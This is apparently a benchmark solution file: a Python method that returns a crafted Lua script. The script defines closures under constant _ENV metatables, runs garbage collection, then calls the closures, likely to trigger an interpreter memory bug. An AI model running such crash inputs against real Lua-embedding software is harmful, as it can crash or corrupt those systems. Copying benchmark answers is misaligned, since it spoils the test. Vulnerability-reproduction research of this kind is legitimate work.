import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        payload = (
            'do local _ENV <const> = setmetatable({}, {__index=_G}); function _G.f1() return x end end\n'
            'do local _ENV <const> = setmetatable({}, {__index=_G}); rawset(_G,"f2", function() return y end) end\n'
            'do local _ENV <const> = setmetatable({}, {__index=_G}); local function mk() return function() return z end end; rawset(_G,"f3", mk()) end\n'
            'do local _ENV <const> = setmetatable({}, {__index=_G}); function _G.s1() x=1 end end\n'
            'do local _ENV <const> = setmetatable({}, {__index=_G}); function _G.s2() for i=1,3 do y=i end end end\n'
            'local function gen() local _ENV <const> = setmetatable({}, {__index=_G}); return function() return c end end; _G.g = gen()\n'
            'local function gen2() local _ENV <const> = setmetatable({}, {__index=_G}); return function() d=42 end end; _G.gs = gen2()\n'
            'collectgarbage(); collectgarbage()\n'
            'f1(); f2(); f3(); s1(); s2(); g(); gs()\n'
            'for i=1,5 do do local _ENV <const> = setmetatable({}, {__index=_G}); rawset(_G, "t"..i, function() return _VERSION and a or b end) end end\n'
            'collectgarbage(); t1(); t2(); t3(); t4(); t5()\n'
        )
        return payload.encode('utf-8')